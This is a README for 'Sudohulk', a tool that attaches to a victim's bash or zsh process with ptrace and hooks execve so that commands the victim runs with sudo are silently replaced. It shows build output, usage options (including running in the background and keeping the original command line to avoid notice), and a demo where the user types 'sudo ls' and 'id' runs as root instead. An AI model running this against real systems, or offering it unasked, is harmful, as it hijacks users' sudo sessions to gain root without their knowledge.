# Sudohulk

This tool change sudo command, hooking the execve syscall using ptrace, tested under bash and zsh

## supported architectures:

- [x] x86_64
- [x] x86
- [x] arm

## How use:

```
$ make
cc -Wall -Wextra -O2 -c -o bin/sh_remotedata.o src/sh_remotedata.c
cc -Wall -Wextra -O2 -c -o bin/sh_string.o src/sh_string.c
cc -Wall -Wextra -O2 -c -o bin/sudohulk.o src/sudohulk.c
cc -Wall -Wextra -O2 -o sudohulk bin/sh_remotedata.o bin/sh_string.o bin/sudohulk.o
$ ./sudohulk 
sudohulk [-qdk] PID COMMAND [ARGS]

Options:
   -q quit when change a command
   -d run in background
   -k keep original command line (appending to new)
```
## NOTES:

PID = bash or zsh pid

To attach the current session use -d option, example:

```
$ ./sudohulk -qd $$ id
running in background, pid:20899
$ sudo ls -lah
[sudo] senha para mmxm: 
uid=0(root) gid=0(root) grupos=0(root)
```

## Demo
[![asciicast](https://asciinema.org/a/159627.png)](https://asciinema.org/a/159627)
